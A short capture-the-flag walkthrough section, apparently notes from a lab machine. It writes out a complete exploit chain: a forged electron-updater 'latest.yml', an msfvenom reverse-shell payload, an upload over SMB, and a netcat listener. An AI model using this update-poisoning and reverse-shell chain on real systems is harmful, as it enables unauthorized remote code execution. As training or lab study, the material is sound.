# Getting a shell
```bash
cat latest.yml 
version: 1.33.7
files:
  - url: r'ev.exe
    sha512: 79xlQv7zZYWn5ata9GK7UOOwetsq9ger4LvwJOQsq/R09HgzUnAZogKVoEg7EWouYCXNc1tvtUniRNFWQC0xHg==
    size: 7168
path: r'ev.exe
sha512: 79xlQv7zZYWn5ata9GK7UOOwetsq9ger4LvwJOQsq/R09HgzUnAZogKVoEg7EWouYCXNc1tvtUniRNFWQC0xHg==
releaseDate: '2021-12-19T11:16:34.627Z'
```

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=9001 -f exe -o rev.exe
```

upload on smb
```bash
$ smbclient //10.10.10.237/Software_updates
```

```bash
mb: \> cd client1\
smb: \client1\> dir
  .                                   D        0  Sun Dec 19 17:42:15 2021
  ..                                  D        0  Sun Dec 19 17:42:15 2021
pu
                4413951 blocks of size 4096. 1342927 blocks available
smb: \client1\> put rev.exe r'ev.exe
putting file rev.exe as \client1\r'ev.exe (12,4 kb/s) (average 6,8 kb/s)
smb: \client1\> put latest.yml 
putting file latest.yml as \client1\latest.yml (0,6 kb/s) (average 5,6 kb/s)
smb: \client1\> dir
  .                                   D        0  Sun Dec 19 17:44:49 2021
  ..                                  D        0  Sun Dec 19 17:44:49 2021
  latest.yml                          A      309  Sun Dec 19 17:44:50 2021
  r'ev.exe                            A     7168  Sun Dec 19 17:44:44 2021

                4413951 blocks of size 4096. 1342893 blocks available
smb: \client1\>
```

```bash
$ rlwrap nc -lvnp 9001
```
![[Pasted image 20211219164354.png]]
